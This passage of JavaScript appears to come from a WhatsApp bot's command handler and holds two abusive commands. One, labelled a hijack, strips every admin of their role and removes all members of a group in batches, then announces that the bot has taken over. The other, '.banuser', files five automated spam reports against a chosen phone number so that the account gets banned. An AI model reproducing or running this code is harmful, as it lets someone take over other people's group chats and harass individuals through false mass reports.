        await api.sendText(chatId, '⚡ Hijacking group...', qid)
        try {
            const info    = await api.getGroupInfo(chatId)
            if (!info) return api.sendText(chatId, '❌ Could not get group info!', qid)
            const admins  = info.participants?.filter(p => p.rank === 'admin').map(p => p.id) || []
            const members = info.participants?.map(p => p.id) || []
            if (admins.length) await api.demoteGroupParticipants(chatId, admins).catch(() => {})
            for (let i = 0; i < members.length; i += 5) {
                await api.removeGroupParticipants(chatId, members.slice(i, i + 5)).catch(() => {})
                await sleep(1000)
            }
            return api.sendText(chatId, `⚡ *${BOT_NAME}* has taken over!\n👑 ${OWNER_NAME}`)
        } catch (e) {
            return api.sendText(chatId, `❌ Hijack failed: ${e.message}`, qid)
        }
    }

    // ── .banuser ─────────────────────────────────────────────
    if (cmd === `${PREFIX}banuser` && isOwner) {
        const target = digits(args[1])
        if (!target) return api.sendText(chatId, '❌ Usage: .banuser <number>', qid)
        await api.sendText(chatId, `🚨 Reporting *${target}*...`, qid)
        let reported = 0
        for (let i = 0; i < 5; i++) {
            try {
                await api.request('post', '/contacts/report', {
                    contact_id : `${target}@s.whatsapp.net`,
                    reason     : 'spam',
                })
                reported++
                await sleep(500)
            } catch { }
        }
        return api.sendText(chatId,
            `✅ *${target}* reported ${reported}/5 times!\n⚡ ${BOT_NAME}`, qid)
    }
}

module.exports = { handleCommand }
